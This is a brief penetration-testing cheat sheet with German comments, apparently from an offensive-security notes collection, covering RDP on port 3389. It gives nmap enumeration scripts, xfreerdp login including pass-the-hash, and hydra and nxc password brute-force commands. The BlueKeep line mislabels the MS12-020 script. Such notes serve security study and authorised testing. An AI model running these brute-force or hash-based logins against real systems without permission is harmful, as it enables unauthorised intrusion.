# 🖥️ RDP (3389)

## Enum

```bash
nmap -p3389 --script "rdp-*" $RHOST
nmap -p3389 --script rdp-enum-encryption,rdp-vuln-ms12-020 $RHOST

# BlueKeep (CVE-2019-0708)
nmap -p3389 --script rdp-vuln-ms12-020 $RHOST
```

## Connect

```bash
xfreerdp /u:user /p:pass /v:$RHOST /dynamic-resolution +clipboard
xfreerdp /u:user /pth:<NTLM-HASH> /v:$RHOST            # Pass-the-Hash!

# rdesktop (älter)
rdesktop -u user -p pass $RHOST
```

## Bruteforce

```bash
hydra -L users.txt -P passwords.txt rdp://$RHOST
nxc rdp $RHOST -u users.txt -p passwords.txt --continue-on-success
```

## Mit gültigen Creds → meist direkt am Ziel

→ Nach Login: [Windows PrivEsc](../../03-PrivEsc/Windows/README.md)
